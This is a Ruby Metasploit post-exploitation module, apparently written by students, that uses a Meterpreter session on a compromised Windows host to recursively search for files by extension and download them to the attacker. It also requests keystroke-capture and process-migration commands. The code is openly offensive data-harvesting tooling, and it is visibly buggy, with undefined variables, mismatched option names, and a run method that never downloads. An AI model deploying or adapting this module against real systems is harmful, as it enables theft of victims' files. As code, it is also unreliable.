##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'files manager for windows',
        'Description' => %q{
          get a resource from a system windows
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('EXTENSION', [false, 'File Extension to harvest', '']),
        OptPath.new('STARTING_POINT_PATH', [false, 'Starting point', '']),
        OptPath.new('SAVE_PATH', [false, 'path where the files will be saved.', '']),
        OptString.new('BREAKING_POINT_FILE', [false, 'Stop when file founded', '']),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
        OptString.new('FILE_NAME', [false, 'search a specific file', '']),
      ]
    )
  end

  def download_file(file_to_download)

    save_path = datastore['SAVE_PATH'
  ]
    begin
      print_status("Downloading file #{file_path}...")
      client.fs.file.download(save_path, file_path)
      print_good("File downloaded successfully to #{save_path}")
    rescue ::Exception => e
      print_error("Failed to download file: #{e.message}")
    end
  end
  
  def get_files_list()

    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT']
    verbose = datastore['VERBOSE']

      files = []
  
      if verbose == true then puts "browsing subdirectories..." end

      Dir.glob("#{starting_point}/**/*").each do |file|

      if File.file?(file) && File.extname(file) == ".#{extension}"

          if verbose == true
            puts "file with "+extension+" found !"
            puts "file : "+File.basename(file)
          end

          files << file
        end
      end
  
      return files
    end

# Méthode pour récupérer récursivement la liste des fichiers sur la machine distante
def list_files_distant(start_dir, extension)
  begin
    print_status("Retrieving files list from starting : #{start_dir}...")
    files_list = []

    # Fonction récursive pour parcourir tous les répertoires et sous-répertoires
    recursive_list_files(start_dir, files_list, extension)

    return files_list
  rescue ::Exception => e
    print_error("Failed to retrieve files list: #{e.message}")
    return []
  end
end

# Fonction récursive pour parcourir récursivement tous les répertoires et sous-répertoires
def recursive_list_files(dir, files_list, extension)

  verbose = datastore['VERBOSE']
  # Récupérer la liste des fichiers dans le répertoire actuel
  client.fs.dir.foreach(dir) do |entry|
    next if entry == '.' || entry == '..'
    full_path = "#{dir}/#{entry}"
    if client.fs.file.stat(full_path).directory?
      # Si c'est un répertoire, appeler récursivement la fonction pour parcourir ses fichiers
      recursive_list_files(full_path, files_list, extension)
      print_status("file : "+File.dirname(full_path)+File.basename(full_path))
    elsif File.extname(full_path) == extension
      # Si c'est un fichier, l'ajouter à la liste
      if verbose == true
        puts "file with "+extension+" found !"
        puts "file : "+File.basename(file)
      end
      
      files_list << full_path
    end
  end
end


  def run
    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT']
   

    list_files_distant(starting_point, extension)
  end
end
